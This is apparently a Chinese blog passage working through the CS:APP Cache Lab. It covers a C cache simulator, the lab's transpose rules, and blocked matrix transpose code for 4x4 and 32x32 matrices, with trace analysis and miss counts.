keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%c %xu,%d\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>operation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>operation<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token char">'L'</span><span class="token operator">:</span>            <span class="token function">update</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'M'</span><span class="token operator">:</span>            <span class="token function">update</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'S'</span><span class="token operator">:</span>            <span class="token function">update</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">update_stamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">free</span><span class="token punctuation">(</span>cache_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>cache_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">sf</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> opt<span class="token punctuation">;</span>    <span class="token comment">// 拆分输入的规定</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>opt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"hvs:E:b:t:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>opt<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token char">'h'</span><span class="token operator">:</span>            h <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'v'</span><span class="token operator">:</span>            v <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span>            s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'E'</span><span class="token operator">:</span>            E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'b'</span><span class="token operator">:</span>            b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token char">'t'</span><span class="token operator">:</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token operator">:</span>            <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> E <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> b <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> t <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    S <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">sf</span> <span class="token punctuation">(</span>argc<span class="token punctuation">,</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">init_cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">simulate_cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printSummary</span><span class="token punctuation">(</span>hit_count<span class="token punctuation">,</span> miss_count<span class="token punctuation">,</span> eviction_count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Part-2-Block"><a href="#Part-2-Block" class="headerlink" title="Part_2 Block"></a>Part_2 Block</h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h3><p>给定的是s&#x3D;5,E&#x3D;1,b&#x3D;5;故S&#x3D;1&lt;&lt;s  &#x3D;&#x3D;&gt;  S&#x3D;32</p><p>故一共有32组set,每组1line,每line有32Bytes,由tran.c内的函数可知,矩阵中存的是int类型的数组 故每个cache_line能存8个int 变量</p><h3 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3><blockquote><p>• Your code in trans.c must compile without warnings to receive credit.</p><p>• You are allowed to deﬁne at most 12 local variables of type int per transpose function.1 </p><p>• You are not allowed to side-step the previous rule by using any variables of type long or by using any bit tricks to store more than one value to a single variable.</p><p>• Your transpose function may not use recursion.</p><p>• If you choose to use helper functions, you may not have more than 12 local variables on the stack at a time between your helper functions and your top level transpose function. For example, if your transpose declares 8 variables, and then you call a function which uses 4 variables, which calls another function which uses 2, you will have 14 variables on the stack, and you will be in violation of the rule.</p><p>• Your transpose function may not modify array A. You may, however, do whatever you want with the contents of array B.</p><p>• You are NOT allowed to deﬁne any arrays in your code or to use any variant of malloc.</p></blockquote><h2 id="Eg-4-4"><a href="#Eg-4-4" class="headerlink" title="Eg:4*4"></a>Eg:4*4</h2><blockquote><p>因为题目条件,一个set只有一个line,一个line里面只有一个block,所以我们说的line和block在part_2里面几乎可以划为等价符号.</p></blockquote><p>以4*4分块为例子分析,以文章的限定条件,一个cache_line能存放8个int类型的数据,我们同样知道要是存到缓存中A的第一二行都会在同一个line里面而三四行在第二个line里面.</p><p>我们分别用朴素代码跑一遍</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023684.png" alt="image-20240312100228129"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"># 朴素代码<span class="token keyword">void</span> <span class="token function">trans</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">,</span> <span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> M<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            tmp <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们测试一下原始代码</p><pre class="line-numbers language-none"><code class="language-none">make &amp;&amp; .&#x2F;test-trans -M 4 -N 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果如下</p><pre class="line-numbers language-(空)" data-language="(空)"><code class="language-(空)">hits:15, misses:22, evictions:19<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重点分析原始代码,即自带的朴素转置造成多miss的原因</p><p>我们在终端输入以下命令来跟踪输出(命令能在文首的write up链接的pdf中看见,请仔细看!!!)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token operator">/</span>csim<span class="token operator">-</span>ref <span class="token operator">-</span>v <span class="token operator">-</span>s <span class="token number">5</span> <span class="token operator">-</span>E <span class="token number">1</span> <span class="token operator">-</span>b <span class="token number">5</span> <span class="token operator">-</span>t <span class="token function">f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">trace</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>txt<span class="token comment">//f(i)为函数顺序输出的文件 fi要看你是第几个函数,会输出对应的fi(1,2,3,4...)的跟踪文件,然后用csim-ref模拟跑一遍</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个是朴素代码的跟踪结果,我们观察分析</p><pre class="line-numbers language-none"><code class="language-none">S 18d0cc,1 miss L 18d100,8 miss L 18d0c4,4 hit L 18d0c0,4 hit   &#x2F;&#x2F;Valgrind 模拟,函数,等等的系统性开支-------L 10d0c0,4 miss eviction  A数组访问A[0][0]，冷不命中，将块11装入cacheS 14d0c0,4 miss eviction  虽然B[0][0]所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组B对应的块11装入cacheL 10d0c4,4 miss eviction  A数组访问A[0][1]，虽然A[0][1] 所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组A对应的块11装入cache。S 14d0d0,4 miss eviction  虽然B[1][0]所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组B对应的块11装入cacheL 10d0c8,4 miss eviction  虽然A[0][2]所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组A对应的块11装入cache。S 14d0e0,4 miss               B数组访问B[2][0]，B[2][0] 所映射的块12不在cache中，冷不命中，将数组B对应的块12装入cacheL 10d0cc,4 hit                   A[0][3]所映射的块11在cache中，且标记位相同，故命中。S 14d0f0,4 hit                   BhitL 10d0d0,4 hit                  A[1][0]所映射的块11在cache中，且标记位相同，故命中。S 14d0c4,4 miss eviction  虽然B[0][1] 所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组B对应的块11装入cache。......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们能发现,他之所以冲突就是因为在朴素代码中,由于A,B两个数组下标相同时,或者是因为其在缓存上的排列,当两个块在缓存中的映射位置相同时,例如A[0,0]已经加载到缓存中了,为了个B[0,0]赋值,只能把A[0,0]驱逐,但是写完B[0,0]后又要读入A[1,0],其映射的块又是在11(这个是由地址算出来的),所以B[0,0]又要被驱逐,重复很多次的冲突所以就会导致miss数量维持较高.</p><p>所以我们有什么办法呢?我们知道:<br>要先读入A数组再读入B数组,有没有办法能一次性读完A进入到缓存的部分呢?有的!,由上图我们知道A进入缓存的部分11块中有8个int,所以我们可以创建8个局部变量,把这8个int都存起来,然后再把b读进来,这样读过的A就不用再读了!就可以减少很多冲突!</p><p>代码如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#优化代码<span class="token keyword">void</span> <span class="token function">trans_test</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">,</span><span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> B<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>x3<span class="token punctuation">,</span>x4<span class="token punctuation">,</span>x5<span class="token punctuation">,</span>x6<span class="token punctuation">,</span>x7<span class="token punctuation">,</span>x8<span class="token punctuation">,</span>i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     x1<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x2<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x3<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x4<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x5<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x6<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x7<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x8<span class="token operator">=</span>A<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>x1<span class="token punctuation">;</span><span class="token punctuation">,</span>B<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>x2<span class="token punctuation">,</span>B<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>x3<span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>x4<span class="token punctuation">,</span>B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>x5<span class="token punctuation">,</span>B<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>x6<span class="token punctuation">,</span>B<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>x7<span class="token punctuation">,</span>B<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>x8<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试结果如下:</p><pre class="line-numbers language-(空)" data-language="(空)"><code class="language-(空)">hits:29, misses:8, evictions:5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>miss数大量减少,所以要是可以理解的话,我们就继续往下看趴!</p><h2 id="Phase-1-32-32"><a href="#Phase-1-32-32" class="headerlink" title="Phase_1:32*32"></a>Phase_1:32*32</h2><h3 id="通关思路"><a href="#通关思路" class="headerlink" title="通关思路"></a>通关思路</h3><p>依据ppt的内容,我们往分块方向上去讨论,8*8分块,因为一个cache_line只能存8个int,所以我们使用8*8的分块形式能恰好利用到前八行由下面的图可以看出,除却对角线上的元素,对应色块的转置采用8*8几乎是互不干扰的,因为其映射的地址不一样,所以我们将cache划分成从上往下共四份是有用的.所以我们在每个分块里单独进行转置,能减少很多次因为冲突而导致的Miss.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> trans_1_desc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"直接进行8*8的分块,不做任何优化"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">trans_1</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">,</span><span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> B<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>j<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token operator">=</span>i<span class="token punctuation">;</span>m<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>i<span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token operator">=</span>j<span class="token punctuation">;</span>n<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>j<span class="token punctuation">;</span>n<span class="token operator">++</span><span class="token punctuation">)</span>        B<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后便会得到以下结果</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023722.png" alt="image-20240312103414780"></p><p>对角线图示:</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023761.png" alt="image-20240312110516371"></p><p>Miss:343离满分差了一点,我们发现色块之间的转置其实已经优化到上限了,现在要优化的就是对角线,因为对角线上的快存在原地转置的问题,比如A[0,0]和B[0,0]对应的位置其实是一样的,在这里面要是不特殊操作那发生的情况就类似于4*4的情况.要是你对4*4的例子理解透彻的话,那很简单,我们只用把A一整行的8个int全部都取出来,存在8个局部变量中,再转置到b,这样就能大大简化eviction的数量了.</p><p>优化一下对角线代码,即对内层进行展开.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> trans_2_desc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"进行8*8的分块,并且优化对角线"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">trans_2</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span><span class="token keyword">int</span> N <span class="token punctuation">,</span><span class="token keyword">int</span> A<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>m<span class="token punctuation">,</span>n<span class="token punctuation">,</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>x3<span class="token punctuation">,</span>x4<span class="token punctuation">,</span>x5<span class="token punctuation">,</span>x6<span class="token punctuation">,</span>x7<span class="token punctuation">,</span>x8<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>N<span class="token punctuation">;</span>j<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>m<span class="token operator">=</span>i<span class="token punctuation">;</span>m<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">+</span>i<span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                   x1<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                   x2<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   x3<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   x4<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   x5<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   x6<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   x7<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   x8<span class="token operator">=</span>A<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x1<span class="token punctuation">;</span>                   B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x2<span class="token punctuation">;</span>                   B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x3<span class="token punctuation">;</span>                   B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x4<span class="token punctuation">;</span>                   B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x5<span class="token punctuation">;</span>                   B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">=</span>x6<span class="token punctuation">;</span>                   B<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token 